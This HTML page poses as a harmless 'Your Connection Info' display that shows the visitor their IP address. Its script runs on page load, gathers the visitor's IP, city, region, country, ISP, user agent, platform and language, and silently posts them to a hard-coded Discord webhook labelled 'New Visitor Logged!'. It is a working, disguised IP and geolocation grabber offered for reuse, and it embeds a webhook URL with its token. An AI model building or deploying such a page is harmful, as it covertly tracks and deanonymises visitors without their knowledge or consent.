<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Info</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #333;
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }
        #ip-address {
            font-size: 1.25rem;
            color: #007bff;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>Your Connection Info:</h1>
        <div id="ip-address">Loading...</div>
    </div>

    <script>
        // Replace with your actual Discord Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534703292934787283/hoj4Ifi-vZe91DhEa7PSaOhqeW4-rGf0sj0U46HDAZAbS8PHqebMKcVTMOUO3lq1aW3t';

        async function gatherAndSend() {
            try {
                // 1. Fetch IP and Geolocation data using a free API (ipapi.co)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const ip = data.ip || 'Unknown';
                const city = data.city || 'Unknown';
                const region = data.region || 'Unknown';
                const country = data.country_name || 'Unknown';
                const isp = data.org || 'Unknown';

                // 2. Gather browser and device info
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;

                // Display IP on the webpage
                document.getElementById('ip-address').textContent = ip;

                // 3. Construct a rich, formatted message for Discord
                const discordPayload = {
                    embeds: [{
                        title: "🚨 New Visitor Logged!",
                        color: 3447003, // Blue color embed
                        fields: [
                            { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
                            { name: "🏢 ISP / Carrier", value: `\`${isp}\``, inline: false },
                            { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: false },
                            { name: "💻 Device / OS", value: `\`${platform}\``, inline: true },
                            { name: "🌍 Browser Language", value: `\`${language}\``, inline: true },
                            { name: "🔎 User Agent", value: `\`${userAgent}\``, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                // 4. Send to Discord Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordPayload)
                });

            } catch (error) {
                document.getElementById('ip-address').textContent = 'Unable to retrieve info.';
                console.error('Error:', error);
            }
        }

        gatherAndSend();
    </script>

</body>
</html>
